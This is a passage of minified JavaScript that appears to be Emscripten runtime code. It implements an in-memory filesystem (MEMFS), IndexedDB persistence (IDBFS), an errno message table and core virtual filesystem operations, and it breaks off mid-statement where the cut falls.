MEMFS={ops_table:null,mount:function(mount){return MEMFS.createNode(null,"/",16895,0)},createNode:function(parent,name,mode,dev){if(FS.isBlkdev(mode)||FS.isFIFO(mode))throw new FS.ErrnoError(63);MEMFS.ops_table||(MEMFS.ops_table={dir:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr,lookup:MEMFS.node_ops.lookup,mknod:MEMFS.node_ops.mknod,rename:MEMFS.node_ops.rename,unlink:MEMFS.node_ops.unlink,rmdir:MEMFS.node_ops.rmdir,readdir:MEMFS.node_ops.readdir,symlink:MEMFS.node_ops.symlink},stream:{llseek:MEMFS.stream_ops.llseek}},file:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr},stream:{llseek:MEMFS.stream_ops.llseek,read:MEMFS.stream_ops.read,write:MEMFS.stream_ops.write,allocate:MEMFS.stream_ops.allocate,mmap:MEMFS.stream_ops.mmap,msync:MEMFS.stream_ops.msync}},link:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr,readlink:MEMFS.node_ops.readlink},stream:{}},chrdev:{node:{getattr:MEMFS.node_ops.getattr,setattr:MEMFS.node_ops.setattr},stream:FS.chrdev_stream_ops}});var node=FS.createNode(parent,name,mode,dev);return FS.isDir(node.mode)?(node.node_ops=MEMFS.ops_table.dir.node,node.stream_ops=MEMFS.ops_table.dir.stream,node.contents={}):FS.isFile(node.mode)?(node.node_ops=MEMFS.ops_table.file.node,node.stream_ops=MEMFS.ops_table.file.stream,node.usedBytes=0,node.contents=null):FS.isLink(node.mode)?(node.node_ops=MEMFS.ops_table.link.node,node.stream_ops=MEMFS.ops_table.link.stream):FS.isChrdev(node.mode)&&(node.node_ops=MEMFS.ops_table.chrdev.node,node.stream_ops=MEMFS.ops_table.chrdev.stream),node.timestamp=Date.now(),parent&&(parent.contents[name]=node,parent.timestamp=node.timestamp),node},getFileDataAsTypedArray:function(node){return node.contents?node.contents.subarray?node.contents.subarray(0,node.usedBytes):new Uint8Array(node.contents):new Uint8Array(0)},expandFileStorage:function(node,newCapacity){var prevCapacity=node.contents?node.contents.length:0;if(!(prevCapacity>=newCapacity)){newCapacity=Math.max(newCapacity,prevCapacity*(prevCapacity<1048576?2:1.125)>>>0),0!=prevCapacity&&(newCapacity=Math.max(newCapacity,256));var oldContents=node.contents;node.contents=new Uint8Array(newCapacity),node.usedBytes>0&&node.contents.set(oldContents.subarray(0,node.usedBytes),0)}},resizeFileStorage:function(node,newSize){if(node.usedBytes!=newSize)if(0==newSize)node.contents=null,node.usedBytes=0;else{var oldContents=node.contents;node.contents=new Uint8Array(newSize),oldContents&&node.contents.set(oldContents.subarray(0,Math.min(newSize,node.usedBytes))),node.usedBytes=newSize}},node_ops:{getattr:function(node){var attr={};return attr.dev=FS.isChrdev(node.mode)?node.id:1,attr.ino=node.id,attr.mode=node.mode,attr.nlink=1,attr.uid=0,attr.gid=0,attr.rdev=node.rdev,FS.isDir(node.mode)?attr.size=4096:FS.isFile(node.mode)?attr.size=node.usedBytes:FS.isLink(node.mode)?attr.size=node.link.length:attr.size=0,attr.atime=new Date(node.timestamp),attr.mtime=new Date(node.timestamp),attr.ctime=new Date(node.timestamp),attr.blksize=4096,attr.blocks=Math.ceil(attr.size/attr.blksize),attr},setattr:function(node,attr){void 0!==attr.mode&&(node.mode=attr.mode),void 0!==attr.timestamp&&(node.timestamp=attr.timestamp),void 0!==attr.size&&MEMFS.resizeFileStorage(node,attr.size)},lookup:function(parent,name){throw FS.genericErrors[44]},mknod:function(parent,name,mode,dev){return MEMFS.createNode(parent,name,mode,dev)},rename:function(old_node,new_dir,new_name){if(FS.isDir(old_node.mode)){var new_node;try{new_node=FS.lookupNode(new_dir,new_name)}catch(e){}if(new_node)for(var i in new_node.contents)throw new FS.ErrnoError(55)}delete old_node.parent.contents[old_node.name],old_node.parent.timestamp=Date.now(),old_node.name=new_name,new_dir.contents[new_name]=old_node,new_dir.timestamp=old_node.parent.timestamp,old_node.parent=new_dir},unlink:function(parent,name){delete parent.contents[name],parent.timestamp=Date.now()},rmdir:function(parent,name){var node=FS.lookupNode(parent,name);for(var i in node.contents)throw new FS.ErrnoError(55);delete parent.contents[name],parent.timestamp=Date.now()},readdir:function(node){var entries=[".",".."];for(var key in node.contents)node.contents.hasOwnProperty(key)&&entries.push(key);return entries},symlink:function(parent,newname,oldpath){var node=MEMFS.createNode(parent,newname,41471,0);return node.link=oldpath,node},readlink:function(node){if(!FS.isLink(node.mode))throw new FS.ErrnoError(28);return node.link}},stream_ops:{read:function(stream,buffer,offset,length,position){var contents=stream.node.contents;if(position>=stream.node.usedBytes)return 0;var size=Math.min(stream.node.usedBytes-position,length);if(assert(size>=0),size>8&&contents.subarray)buffer.set(contents.subarray(position,position+size),offset);else for(var i=0;i<size;i++)buffer[offset+i]=contents[position+i];return size},write:function(stream,buffer,offset,length,position,canOwn){if(assert(!(buffer instanceof ArrayBuffer)),buffer.buffer===GROWABLE_HEAP_I8().buffer&&(canOwn=!1),!length)return 0;var node=stream.node;if(node.timestamp=Date.now(),buffer.subarray&&(!node.contents||node.contents.subarray)){if(canOwn)return assert(0===position,"canOwn must imply no weird position inside the file"),node.contents=buffer.subarray(offset,offset+length),node.usedBytes=length,length;if(0===node.usedBytes&&0===position)return node.contents=buffer.slice(offset,offset+length),node.usedBytes=length,length;if(position+length<=node.usedBytes)return node.contents.set(buffer.subarray(offset,offset+length),position),length}if(MEMFS.expandFileStorage(node,position+length),node.contents.subarray&&buffer.subarray)node.contents.set(buffer.subarray(offset,offset+length),position);else for(var i=0;i<length;i++)node.contents[position+i]=buffer[offset+i];return node.usedBytes=Math.max(node.usedBytes,position+length),length},llseek:function(stream,offset,whence){var position=offset;if(1===whence?position+=stream.position:2===whence&&FS.isFile(stream.node.mode)&&(position+=stream.node.usedBytes),position<0)throw new FS.ErrnoError(28);return position},allocate:function(stream,offset,length){MEMFS.expandFileStorage(stream.node,offset+length),stream.node.usedBytes=Math.max(stream.node.usedBytes,offset+length)},mmap:function(stream,length,position,prot,flags){if(!FS.isFile(stream.node.mode))throw new FS.ErrnoError(43);var ptr,allocated,contents=stream.node.contents;if(2&flags||contents.buffer!==buffer){if((position>0||position+length<contents.length)&&(contents=contents.subarray?contents.subarray(position,position+length):Array.prototype.slice.call(contents,position,position+length)),allocated=!0,!(ptr=mmapAlloc(length)))throw new FS.ErrnoError(48);GROWABLE_HEAP_I8().set(contents,ptr)}else allocated=!1,ptr=contents.byteOffset;return{ptr:ptr,allocated:allocated}},msync:function(stream,buffer,offset,length,mmapFlags){if(!FS.isFile(stream.node.mode))throw new FS.ErrnoError(43);if(2&mmapFlags)return 0;MEMFS.stream_ops.write(stream,buffer,0,length,offset,!1);return 0}}};function asyncLoad(url,onload,onerror,noRunDep){var dep=noRunDep?"":getUniqueRunDependency("al "+url);readAsync(url,(arrayBuffer=>{assert(arrayBuffer,'Loading data file "'+url+'" failed (no arrayBuffer).'),onload(new Uint8Array(arrayBuffer)),dep&&removeRunDependency(dep)}),(event=>{if(!onerror)throw'Loading data file "'+url+'" failed.';onerror()})),dep&&addRunDependency(dep)}var IDBFS={dbs:{},indexedDB:()=>{if("undefined"!=typeof indexedDB)return indexedDB;var ret=null;return"object"==typeof window&&(ret=window.indexedDB||window.mozIndexedDB||window.webkitIndexedDB||window.msIndexedDB),assert(ret,"IDBFS used, but indexedDB not supported"),ret},DB_VERSION:21,DB_STORE_NAME:"FILE_DATA",mount:function(mount){return MEMFS.mount.apply(null,arguments)},syncfs:(mount,populate,callback)=>{IDBFS.getLocalSet(mount,((err,local)=>{if(err)return callback(err);IDBFS.getRemoteSet(mount,((err,remote)=>{if(err)return callback(err);var src=populate?remote:local,dst=populate?local:remote;IDBFS.reconcile(src,dst,callback)}))}))},quit:()=>{Object.values(IDBFS.dbs).forEach((value=>value.close())),IDBFS.dbs={}},getDB:(name,callback)=>{var req,db=IDBFS.dbs[name];if(db)return callback(null,db);try{req=IDBFS.indexedDB().open(name,IDBFS.DB_VERSION)}catch(e){return callback(e)}if(!req)return callback("Unable to connect to IndexedDB");req.onupgradeneeded=e=>{var fileStore,db=e.target.result,transaction=e.target.transaction;(fileStore=db.objectStoreNames.contains(IDBFS.DB_STORE_NAME)?transaction.objectStore(IDBFS.DB_STORE_NAME):db.createObjectStore(IDBFS.DB_STORE_NAME)).indexNames.contains("timestamp")||fileStore.createIndex("timestamp","timestamp",{unique:!1})},req.onsuccess=()=>{db=req.result,IDBFS.dbs[name]=db,callback(null,db)},req.onerror=e=>{callback(this.error),e.preventDefault()}},getLocalSet:(mount,callback)=>{var entries={};function isRealDir(p){return"."!==p&&".."!==p}function toAbsolute(root){return p=>PATH.join2(root,p)}for(var check=FS.readdir(mount.mountpoint).filter(isRealDir).map(toAbsolute(mount.mountpoint));check.length;){var stat,path=check.pop();try{stat=FS.stat(path)}catch(e){return callback(e)}FS.isDir(stat.mode)&&check.push.apply(check,FS.readdir(path).filter(isRealDir).map(toAbsolute(path))),entries[path]={timestamp:stat.mtime}}return callback(null,{type:"local",entries:entries})},getRemoteSet:(mount,callback)=>{var entries={};IDBFS.getDB(mount.mountpoint,((err,db)=>{if(err)return callback(err);try{var transaction=db.transaction([IDBFS.DB_STORE_NAME],"readonly");transaction.onerror=e=>{callback(this.error),e.preventDefault()},transaction.objectStore(IDBFS.DB_STORE_NAME).index("timestamp").openKeyCursor().onsuccess=event=>{var cursor=event.target.result;if(!cursor)return callback(null,{type:"remote",db:db,entries:entries});entries[cursor.primaryKey]={timestamp:cursor.key},cursor.continue()}}catch(e){return callback(e)}}))},loadLocalEntry:(path,callback)=>{var stat,node;try{node=FS.lookupPath(path).node,stat=FS.stat(path)}catch(e){return callback(e)}return FS.isDir(stat.mode)?callback(null,{timestamp:stat.mtime,mode:stat.mode}):FS.isFile(stat.mode)?(node.contents=MEMFS.getFileDataAsTypedArray(node),callback(null,{timestamp:stat.mtime,mode:stat.mode,contents:node.contents})):callback(new Error("node type not supported"))},storeLocalEntry:(path,entry,callback)=>{try{if(FS.isDir(entry.mode))FS.mkdirTree(path,entry.mode);else{if(!FS.isFile(entry.mode))return callback(new Error("node type not supported"));FS.writeFile(path,entry.contents,{canOwn:!0})}FS.chmod(path,entry.mode),FS.utime(path,entry.timestamp,entry.timestamp)}catch(e){return callback(e)}callback(null)},removeLocalEntry:(path,callback)=>{try{var stat=FS.stat(path);FS.isDir(stat.mode)?FS.rmdir(path):FS.isFile(stat.mode)&&FS.unlink(path)}catch(e){return callback(e)}callback(null)},loadRemoteEntry:(store,path,callback)=>{var req=store.get(path);req.onsuccess=event=>{callback(null,event.target.result)},req.onerror=e=>{callback(this.error),e.preventDefault()}},storeRemoteEntry:(store,path,entry,callback)=>{try{var req=store.put(entry,path)}catch(e){return void callback(e)}req.onsuccess=()=>{callback(null)},req.onerror=e=>{callback(this.error),e.preventDefault()}},removeRemoteEntry:(store,path,callback)=>{var req=store.delete(path);req.onsuccess=()=>{callback(null)},req.onerror=e=>{callback(this.error),e.preventDefault()}},reconcile:(src,dst,callback)=>{var total=0,create=[];Object.keys(src.entries).forEach((function(key){var e=src.entries[key],e2=dst.entries[key];e2&&e.timestamp.getTime()==e2.timestamp.getTime()||(create.push(key),total++)}));var remove=[];if(Object.keys(dst.entries).forEach((function(key){src.entries[key]||(remove.push(key),total++)})),!total)return callback(null);var errored=!1,transaction=("remote"===src.type?src.db:dst.db).transaction([IDBFS.DB_STORE_NAME],"readwrite"),store=transaction.objectStore(IDBFS.DB_STORE_NAME);function done(err){if(err&&!errored)return errored=!0,callback(err)}transaction.onerror=e=>{done(this.error),e.preventDefault()},transaction.oncomplete=e=>{errored||callback(null)},create.sort().forEach((path=>{"local"===dst.type?IDBFS.loadRemoteEntry(store,path,((err,entry)=>{if(err)return done(err);IDBFS.storeLocalEntry(path,entry,done)})):IDBFS.loadLocalEntry(path,((err,entry)=>{if(err)return done(err);IDBFS.storeRemoteEntry(store,path,entry,done)}))})),remove.sort().reverse().forEach((path=>{"local"===dst.type?IDBFS.removeLocalEntry(path,done):IDBFS.removeRemoteEntry(store,path,done)}))}},ERRNO_MESSAGES={0:"Success",1:"Arg list too long",2:"Permission denied",3:"Address already in use",4:"Address not available",5:"Address family not supported by protocol family",6:"No more processes",7:"Socket already connected",8:"Bad file number",9:"Trying to read unreadable message",10:"Mount device busy",11:"Operation canceled",12:"No children",13:"Connection aborted",14:"Connection refused",15:"Connection reset by peer",16:"File locking deadlock error",17:"Destination address required",18:"Math arg out of domain of func",19:"Quota exceeded",20:"File exists",21:"Bad address",22:"File too large",23:"Host is unreachable",24:"Identifier removed",25:"Illegal byte sequence",26:"Connection already in progress",27:"Interrupted system call",28:"Invalid argument",29:"I/O error",30:"Socket is already connected",31:"Is a directory",32:"Too many symbolic links",33:"Too many open files",34:"Too many links",35:"Message too long",36:"Multihop attempted",37:"File or path name too long",38:"Network interface is not configured",39:"Connection reset by network",40:"Network is unreachable",41:"Too many open files in system",42:"No buffer space available",43:"No such device",44:"No such file or directory",45:"Exec format error",46:"No record locks available",47:"The link has been severed",48:"Not enough core",49:"No message of desired type",50:"Protocol not available",51:"No space left on device",52:"Function not implemented",53:"Socket is not connected",54:"Not a directory",55:"Directory not empty",56:"State not recoverable",57:"Socket operation on non-socket",59:"Not a typewriter",60:"No such device or address",61:"Value too large for defined data type",62:"Previous owner died",63:"Not super-user",64:"Broken pipe",65:"Protocol error",66:"Unknown protocol",67:"Protocol wrong type for socket",68:"Math result not representable",69:"Read only file system",70:"Illegal seek",71:"No such process",72:"Stale file handle",73:"Connection timed out",74:"Text file busy",75:"Cross-device link",100:"Device not a stream",101:"Bad font file fmt",102:"Invalid slot",103:"Invalid request code",104:"No anode",105:"Block device required",106:"Channel number out of range",107:"Level 3 halted",108:"Level 3 reset",109:"Link number out of range",110:"Protocol driver not attached",111:"No CSI structure available",112:"Level 2 halted",113:"Invalid exchange",114:"Invalid request descriptor",115:"Exchange full",116:"No data (for no delay io)",117:"Timer expired",118:"Out of streams resources",119:"Machine is not on the network",120:"Package not installed",121:"The object is remote",122:"Advertise error",123:"Srmount error",124:"Communication error on send",125:"Cross mount point (not really error)",126:"Given log. name not unique",127:"f.d. invalid for this operation",128:"Remote address changed",129:"Can   access a needed shared lib",130:"Accessing a corrupted shared lib",131:".lib section in a.out corrupted",132:"Attempting to link in too many libs",133:"Attempting to exec a shared library",135:"Streams pipe error",136:"Too many users",137:"Socket type not supported",138:"Not supported",139:"Protocol family not supported",140:"Can't send after socket shutdown",141:"Too many references",142:"Host is down",148:"No medium (in tape drive)",156:"Level 2 not synchronized"},ERRNO_CODES={},FS={root:null,mounts:[],devices:{},streams:[],nextInode:1,nameTable:null,currentPath:"/",initialized:!1,ignorePermissions:!0,ErrnoError:null,genericErrors:{},filesystems:null,syncFSRequests:0,lookupPath:(path,opts={})=>{if(!(path=PATH_FS.resolve(FS.cwd(),path)))return{path:"",node:null};if((opts=Object.assign({follow_mount:!0,recurse_count:0},opts)).recurse_count>8)throw new FS.ErrnoError(32);for(var parts=PATH.normalizeArray(path.split("/").filter((p=>!!p)),!1),current=FS.root,current_path="/",i=0;i<parts.length;i++){var islast=i===parts.length-1;if(islast&&opts.parent)break;if(current=FS.lookupNode(current,parts[i]),current_path=PATH.join2(current_path,parts[i]),FS.isMountpoint(current)&&(!islast||islast&&opts.follow_mount)&&(current=current.mounted.root),!islast||opts.follow)for(var count=0;FS.isLink(current.mode);){var link=FS.readlink(current_path);if(current_path=PATH_FS.resolve(PATH.dirname(current_path),link),current=FS.lookupPath(current_path,{recurse_count:opts.recurse_count+1}).node,count++>40)throw new FS.ErrnoError(32)}}return{path:current_path,node:current}},getPath:node=>{for(var path;;){if(FS.isRoot(node)){var mount=node.mount.mountpoint;return path?"/"!==mount[mount.length-1]?mount+"/"+path:mount+path:mount}path=path?node.name+"/"+path:node.name,node=node.parent}},hashName:(parentid,name)=>{for(var hash=0,i=0;i<name.length;i++)hash=(hash<<5)-hash+name.charCodeAt(i)|0;return(parentid+hash>>>0)%FS.nameTable.length},hashAddNode:node=>{var hash=FS.hashName(node.parent.id,node.name);node.name_next=FS.nameTable[hash],FS.nameTable[hash]=node},hashRemoveNode:node=>{var hash=FS.hashName(node.parent.id,node.name);if(FS.nameTable[hash]===node)FS.nameTable[hash]=node.name_next;else for(var current=FS.nameTable[hash];current;){if(current.name_next===node){current.name_next=node.name_next;break}current=current.name_next}},lookupNode:(parent,name)=>{var errCode=FS.mayLookup(parent);if(errCode)throw new FS.ErrnoError(errCode,parent);for(var hash=FS.hashName(parent.id,name),node=FS.nameTable[hash];node;node=node.name_next){var nodeName=node.name;if(node.parent.id===parent.id&&nodeName===name)return node}return FS.lookup(parent,name)},createNode:(parent,name,mode,rdev)=>{assert("object"==typeof parent);var node=new FS.FSNode(parent,name,mode,rdev);return FS.hashAddNode(node),node},destroyNode:node=>{FS.hashRemoveNode(node)},isRoot:node=>node===node.parent,isMountpoint:node=>!!node.mounted,isFile:mode=>32768==(61440&mode),isDir:mode=>16384==(61440&mode),isLink:mode=>40960==(61440&mode),isChrdev:mode=>8192==(61440&mode),isBlkdev:mode=>24576==(61440&mode),isFIFO:mode=>4096==(61440&mode),isSocket:mode=>49152==(49152&mode),flagModes:{r:0,"r+":2,w:577,"w+":578,a:1089,"a+":1090},modeStringToFlags:str=>{var flags=FS.flagModes[str];if(void 0===flags)throw new Error("Unknown file open mode: "+str);return flags},flagsToPermissionString:flag=>{var perms=["r","w","rw"][3&flag];return 512&flag&&(perms+="w"),perms},nodePermissions:(node,perms)=>FS.ignorePermissions||(!perms.includes("r")||292&node.mode)&&(!perms.includes("w")||146&node.mode)&&(!perms.includes("x")||73&node.mode)?0:2,mayLookup:dir=>{var errCode=FS.nodePermissions(dir,"x");return errCode||(dir.node_ops.lookup?0:2)},mayCreate:(dir,name)=>{try{FS.lookupNode(dir,name);return 20}catch(e){}return FS.nodePermissions(dir,"wx")},mayDelete:(dir,name,isdir)=>{var node;try{node=FS.lookupNode(dir,name)}catch(e){return e.errno}var errCode=FS.nodePermissions(dir,"wx");if(errCode)return errCode;if(isdir){if(!FS.isDir(node.mode))return 54;if(FS.isRoot(node)||FS.getPath(node)===FS.cwd())return 10}else if(FS.isDir(node.mode))return 31;return 0},mayOpen:(node,flags)=>node?FS.isLink(node.mode)?32:FS.isDir(node.mode)&&("r"!==FS.flagsToPermissionString(flags)||512&flags)?31:FS.nodePermissions(node,FS.flagsToPermissionString(flags)):44,MAX_OPEN_FDS:4096,nextfd:(fd_start=0,fd_end=FS.MAX_OPEN_FDS)=>{for(var fd=fd_start;fd<=fd_end;fd++)if(!FS.streams[fd])return fd;throw new FS.ErrnoError(33)},getStream:fd=>FS.streams[fd],createStream:(stream,fd_start,fd_end)=>{FS.FSStream||(FS.FSStream=function(){this.shared={}},FS.FSStream.prototype={},Object.defineProperties(FS.FSStream.prototype,{object:{get:function(){return this.node},set:function(val){this.node=val}},isRead:{get:function(){return 1!=(2097155&this.flags)}},isWrite:{get:function(){return 0!=(2097155&this.flags)}},isAppend:{get:function(){return 1024&this.flags}},flags:{get:function(){return this.shared.flags},set:function(val){this.shared.flags=val}},position:{get:function(){return this.shared.position},set:function(val){this.shared.position=val}}})),stream=Object.assign(new FS.FSStream,stream);var fd=FS.nextfd(fd_start,fd_end);return stream.fd=fd,FS.streams[fd]=stream,stream},closeStream:fd=>{FS.streams[fd]=null},chrdev_stream_ops:{open:stream=>{var device=FS.getDevice(stream.node.rdev);stream.stream_ops=device.stream_ops,stream.stream_ops.open&&stream.stream_ops.open(stream)},llseek:()=>{throw new FS.ErrnoError(70)}},major:dev=>dev>>8,minor:dev=>255&dev,makedev:(ma,mi)=>ma<<8|mi,registerDevice:(dev,ops)=>{FS.devices[dev]={stream_ops:ops}},getDevice:dev=>FS.devices[dev],getMounts:mount=>{for(var mounts=[],check=[mount];check.length;){var m=check.pop();mounts.push(m),check.push.apply(check,m.mounts)}return mounts},syncfs:(populate,callback)=>{"function"==typeof populate&&(callback=populate,populate=!1),FS.syncFSRequests++,FS.syncFSRequests>1&&err("warning: "+FS.syncFSRequests+" FS.syncfs operations in flight at once, probably just doing extra work");var mounts=FS.getMounts(FS.root.mount),completed=0;function doCallback(errCode){return assert(FS.syncFSRequests>0),FS.syncFSRequests--,callback(errCode)}function done(errCode){if(errCode)return done.errored?void 0:(done.errored=!0,doCallback(errCode));++completed>=mounts.length&&doCallback(null)}mounts.forEach((mount=>{if(!mount.type.syncfs)return done(null);mount.type.syncfs(mount,populate,done)}))},mount:(type,opts,mountpoint)=>{if("string"==typeof type)throw type;var node,root="/"===mountpoint,pseudo=!mountpoint;if(root&&FS.root)throw new FS.ErrnoError(10);if(!root&&!pseudo){var lookup=FS.lookupPath(mountpoint,{follow_mount:!1});if(mountpoint=lookup.path,node=lookup.node,FS.isMountpoint(node))throw new FS.ErrnoError(10);if(!FS.isDir(node.mode))throw new FS.ErrnoError(54)}var mount={type:type,opts:opts,mountpoint:mountpoint,mounts:[]},mountRoot=type.mount(mount);return mountRoot.mount=mount,mount.root=mountRoot,root?FS.root=mountRoot:node&&(node.mounted=mount,node.mount&&node.mount.mounts.push(mount)),mountRoot},unmount:mountpoint=>{var lookup=FS.lookupPath(mountpoint,{follow_mount:!1});if(!FS.isMountpoint(lookup.node))throw new FS.ErrnoError(28);var node=lookup.node,mount=node.mounted,mounts=FS.getMounts(mount);Object.keys(FS.nameTable).forEach((hash=>{for(var current=FS.nameTable[hash];current;){var next=current.name_next;mounts.includes(current.mount)&&FS.destroyNode(current),current=next}})),node.mounted=null;var idx=node.mount.mounts.indexOf(mount);assert(-1!==idx),node.mount.mounts.splice(idx,1)},lookup:(parent,name)=>parent.node_ops.lookup(parent,name),mknod:(path,mode,dev)=>{var parent=FS.lookupPath(path,{parent:!0}).node,name=PATH.basename(path);if(!name||"."===name||".."===name)throw new FS.ErrnoError(28);var errCode=FS.mayCreate(parent,name);if(errCode)throw new FS.ErrnoError(errCode);if(!parent.node_ops.mknod)throw new FS.ErrnoError(63);return parent.node_ops.mknod(parent,name,mode,dev)},create:(path,mode)=>(mode=void 0!==mode?mode:438,mode&=4095,mode|=32768,FS.mknod(path,mode,0)),mkdir:(path,mode)=>(mode=void 0!==mode?mode:511,mode&=1023,mode|=16384,FS.mknod(path,mode,0)),mkdirTree:(path,mode)=>{for(var dirs=path.split("/"),d="",i=0;i<dirs.length;++i)if(dirs[i]){d+="/"+dirs[i];try{FS.mkdir(d,mode)}catch(e){if(20!=e.errno)throw e}}},mkdev:(path,mode,dev)=>(void 0===dev&&(dev=mode,mode=438),mode|=8192,FS.mknod(path,mode,dev)),symlink:(oldpath,newpath)=>{if(!PATH_FS.resolve(oldpath))throw new FS.ErrnoError(44);var parent=FS.lookupPath(newpath,{parent:!0}).node;if(!parent)throw new FS.ErrnoError(44);var newname=PATH.basename(newpath),errCode=FS.mayCreate(parent,newname);if(errCode)throw new FS.ErrnoError(errCode);if(!parent.node_ops.symlink)throw new FS.ErrnoError(63);return parent.node_ops.symlink(parent,newname,oldpath)},rename:(old_path,new_path)=>{var old_dir,new_dir,old_dirname=PATH.dirname(old_path),new_dirname=PATH.dirname(new_path),old_name=PATH.basename(old_path),new_name=PATH.basename(new_path);if(old_dir=FS.lookupPath(old_path,{parent:!0}).node,new_dir=FS.lookupPath(new_path,{parent:!0}).node,!old_dir||!new_dir)throw new FS.ErrnoError(44);if(old_dir.mount!==new_dir.mount)throw new FS.ErrnoError(75);var new_node,old_node=FS.lookupNode(old_dir,old_name),relative=PATH_FS.relative(old_path,new_dirname);if("."!==relative.charAt(0))throw new FS.ErrnoError(28);if("."!==(relative=PATH_FS.relative(new_path,old_dirname)).charAt(0))throw new FS.ErrnoError(55);try{new_node=FS.lookupNode(new_dir,new_name)}catch(e){}if(old_node!==new_node){var isdir=FS.isDir(old_node.mode),errCode=FS.mayDelete(old_dir,old_name,isdir);if(errCode)throw new FS.ErrnoError(errCode);if(errCode=new_node?FS.mayDelete(new_dir,new_name,isdir):FS.mayCreate(new_dir,new_name))throw new FS.ErrnoError(errCode);if(!old_dir.node_ops.rename)throw new FS.ErrnoError(63);if(FS.isMountpoint(old_node)||new_node&&FS.isMountpoint(new_node))throw new FS.ErrnoError(10);if(new_dir!==old_dir&&(errCode=FS.nodePermissions(old_dir,"w")))throw new FS.ErrnoError(errCode);FS.hashRemoveNode(old_node);try{old_dir.node_ops.rename(old_node,new_dir,new_name)}catch(e){throw e}finally{FS.hashAddNode(old_node)}}},rmdir:path=>{var parent=FS.lookupPath(path,{parent:!0}).node,name=PATH.basename(path),node=FS.lookupNode(parent,name),errCode=FS.mayDelete(parent,name,!0);if(errCode)throw new FS.ErrnoError(errCode);if(!parent.node_ops.rmdir)throw new FS.ErrnoError(63);if(FS.isMountpoint(node))throw new FS.ErrnoError(10);parent.node_ops.rmdir(parent,name),FS.destroyNode(node)},readdir:path=>{var node=FS.lookupPath(path,{follow:!0}).node;if(!node.node_ops.readdir)throw new FS.ErrnoError(54);return node.node_ops.readdir(node)},unlink:path=>{var parent=FS.lookupPath(path,{parent:!0}).node;if(!parent)throw new FS.ErrnoError(44);var name=PATH.basename(path),node=FS.lookupNode(parent,name),errCode=FS.mayDelete(parent,name,!1);if(errCode)throw new FS.ErrnoError(errCode);if(!parent.node_ops.unlink)throw new FS.ErrnoError(63);if(FS.isMountpoint(node))throw new FS.ErrnoError(10);parent.node_ops.unlink(parent,name),FS.destroyNode(node)},readlink:path=>{var link=FS.lookupPath(path).node;if(!link)throw new FS.ErrnoError(44);if(!link.node_ops.readlink)throw new FS.ErrnoError(28);return PATH_FS.resolve(FS.getPath(link.parent),link.node_ops.readlink(link))},stat:(path,dontFollow)=>{var node=FS.lookupPath(path,{follow:!dontFollow}).node;if(!node)throw new FS.ErrnoError(44);if(!node.node_ops.getattr)throw new FS.ErrnoError(63);return node.node_ops.getattr(node)},lstat:path=>FS.stat(path,!0),chmod:(path,mode,dontFollow)=>{var node;"string"==typeof path?node=FS.lookupPath(path,{follow:!dontFollow}).node:node=path;if(!node.node_ops.setattr)throw new FS.ErrnoError(63);node.node_ops.setattr(node,{mode:4095&mode|-4096&node.mode,timestamp:Date.now()})},lchmod:(path,mode)=>{FS.chmod(path,mode,!0)},fchmod:(fd,mode)=>{var stream=FS.getStream(fd);if(!stream)throw new FS.ErrnoError(8);FS.chmod(stream.node,mode)},chown:(path,uid,gid,dontFollow)=>{var node;"string"==typeof path?node=FS.lookupPath(path,{follow:!dontFollow}).node:node=path;if(!node.node_ops.setattr)throw new FS.ErrnoError(63);node.node_ops.setattr(node,{timestamp:Date.now()})},lchown:(path,uid,gid)=>{FS.chown(path,uid,gid,!0)},fchown:(fd,uid,gid)=>{var stream=FS.getStream(fd);if(!stream)throw new FS.ErrnoError(8);FS.chown(stream.node,uid,gid)},truncate:(path,len)=>{if(len<0)throw new FS.ErrnoError(28);var node;"string"==typeof path?node=FS.lookupPath(path,{follow:!0}).node:node=path;if(!node.node_ops.setattr)throw new FS.ErrnoError(63);if(FS.isDir(node.mode))throw new FS.ErrnoError(31);if(!FS.isFile(node.mode))throw new FS.ErrnoError(28);var errCode=FS.nodePermissions(node,"w");if(errCode)throw new FS.ErrnoError(errCode);node.node_ops.setattr(node,{size:len,timestamp:Date.now()})},ftruncate:(fd,len)=>{var stream=FS.getStream(fd);if(!stream)throw new FS.ErrnoError(8);if(0==(2097155&stream.flags))throw new FS.ErrnoError(28);FS.truncate(stream.node,len)},utime:(path,atime,mtime)=>{var node=FS.lookupPath(path,{follow:!0}).node;node.node_ops.setattr(node,{timestamp:Math.max(atime,mtime)})},open:(path,flags,mode)=>{if(""===path)throw new FS.ErrnoError(44);var node;if(mode=void 0===mode?438:mode,mode=64&(flags="string"==typeof flags?FS.modeStringToFlags(flags):flags)?4095&mode|32768:0,"object"==typeof path)node=path;else{path=PATH.normalize(path);try{node=FS.lookupPath(path,{follow:!(131072&flags)}).node}catch(e){}}var created=!1;if(64&flags)if(node){if(128&flags)throw new FS.ErrnoError(20)}else node=FS.mknod(path,mode,0),created=!0;if(!node)throw new FS.ErrnoError(44);if(FS.isChrdev(node.mode)&&(flags&=-513),65536&flags&&!FS.isDir(node.mode))throw new FS.ErrnoError(54);if(!created){var errCode=FS.mayOpen(node,flags);if(errCode)throw new FS.ErrnoError(errCode)}512&flags&&!created&&FS.truncate(node,0),flags&=-131713;var stream=FS.createStream({node:node,path:FS.getPath(node),flags:flags,seekable:!0,position:0,stream_ops:node.stream_ops,ungotten:[],error:!1});return stream.stream_ops.open&&stream.stream_ops.open(stream),!Module.logReadFiles||1&flags||(FS.readFiles||(FS.readFiles={}),path in FS.readFiles||(FS.readFiles[path]=1)),stream},close:stream=>{if(FS.isClosed(stream))throw new FS.ErrnoError(8);stream.getdents&&(stream.getdents=null);try{stream.stream_ops.close&&stream.stream_ops.close(stream)}catch(e){throw e}finally{FS.closeStream(stream.fd)}stream.fd=null},isClosed:stream=>null===stream.fd,llseek:(stream,offset,whence)=>{if(FS.isClosed(stream))throw new FS.ErrnoError(8);if(!stream.seekable||!stream.stream_ops.llseek)throw new FS.ErrnoError(70);if(0!=whence&&1!=whence&&2!=whence)throw new FS.ErrnoError(28);return stream.position=stream.stream_ops.llseek(stream,offset,whence),stream.ungotten=[],stream.position},read:(stream,buffer,offset,length,position)=>{if(length<0||position<0)throw new FS.ErrnoError(28);if(FS.isClosed(stream))throw new FS.ErrnoError(8);if(1==(2097155&stream.flags))throw new FS.ErrnoError(8);if(FS.isDir(stream.node.mode))throw new FS.ErrnoError(31);if(!stream.stream_ops.read)throw new FS.ErrnoError(28);var seeking=void 